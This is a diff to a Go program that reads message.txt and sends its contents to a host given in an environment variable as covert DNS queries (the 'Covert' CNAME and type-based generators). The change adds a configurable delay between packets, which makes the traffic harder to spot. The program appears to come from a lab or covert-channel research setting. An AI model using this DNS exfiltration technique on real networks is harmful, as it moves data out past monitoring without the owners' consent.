@@ -2,10 +2,10 @@ package main
 
 import (
 	"fmt"
-	"io/ioutil"
 	"math/rand"
 	"net"
 	"os"
+	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -52,7 +52,11 @@ func generateDNSQuery(domain string, qtype layers.DNSType) ([]byte, error) {
 	return buffer.Bytes(), nil
 }
 
-func udpSender(dnsQueryGenerator func(string) ([][]byte, error), message string) {
+func udpSender(
+	dnsQueryGenerator func(string) ([][]byte, error),
+	message string,
+	waitBetween int,
+) {
 	host := os.Getenv("INSECURENET_HOST_IP")
 	port := 53 // DNS port
 
@@ -103,18 +107,17 @@ func udpSender(dnsQueryGenerator func(string) ([][]byte, error), message string)
 			_, err = conn.Write(dnsQueryPacket)
 		}
 
+		// Wait for a specified duration before sending the next query
+		if waitBetween > 0 {
+			time.Sleep(time.Duration(waitBetween) * time.Millisecond)
+		}
+
 		fmt.Printf("Sent query for: %d.\n", i)
 	}
 }
 
 func readFileToString() (string, error) {
-	file, err := os.Open("message.txt")
-	if err != nil {
-		return "", err
-	}
-	defer file.Close()
-
-	data, err := ioutil.ReadFile("message.txt")
+	data, err := os.ReadFile("message.txt")
 	if err != nil {
 		return "", err
 	}
@@ -130,5 +133,5 @@ func main() {
 		return
 	}
 
-	udpSender(generateCovertCNAMEQueries, message)
+	udpSender(generateCovertTypeQueries, message, 10)
 }
